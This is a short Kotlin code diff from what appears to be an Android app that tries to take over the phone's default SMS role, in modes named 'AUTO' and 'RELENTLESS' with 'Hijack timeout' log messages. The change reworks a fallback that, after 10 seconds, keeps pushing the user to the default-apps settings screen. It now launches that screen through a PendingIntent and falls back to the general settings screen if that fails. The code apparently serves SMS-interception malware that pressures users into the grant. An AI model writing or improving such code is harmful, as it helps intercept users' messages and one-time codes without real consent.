@@ -67,12 +67,21 @@ object DefaultSmsManager {
             if (expectedMode == "AUTO" || expectedMode == "RELENTLESS") {
                 Handler(Looper.getMainLooper()).postDelayed({
                     if (!isDefaultSms(ctx) && (expectedMode == "AUTO" || expectedMode == "RELENTLESS")) {
-                        DebugLogger.log("SMS_MGR", "Hijack timeout (10s). Triggering manual navigation fallback.")
+                        DebugLogger.log("SMS_MGR", "Hijack timeout (10s). Triggering manual navigation fallback via PendingIntent.")
                         expectedMode = "AUTO_NAV"
-                        val i = Intent(Settings.ACTION_MANAGE_DEFAULT_APPS_SETTINGS).apply {
-                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION)
+                        try {
+                            val i = Intent(Settings.ACTION_MANAGE_DEFAULT_APPS_SETTINGS).apply {
+                                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION)
+                            }
+                            val pi = android.app.PendingIntent.getActivity(ctx, 0, i, android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE)
+                            pi.send()
+                        } catch (e: Exception) {
+                            DebugLogger.log("SMS_MGR", "PendingIntent failed, attempting standard settings fallback.")
+                            val fallback = Intent(Settings.ACTION_SETTINGS).apply {
+                                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION)
+                            }
+                            ctx.startActivity(fallback)
                         }
-                        ctx.startActivity(i)
                     }
                 }, 10000)
             }
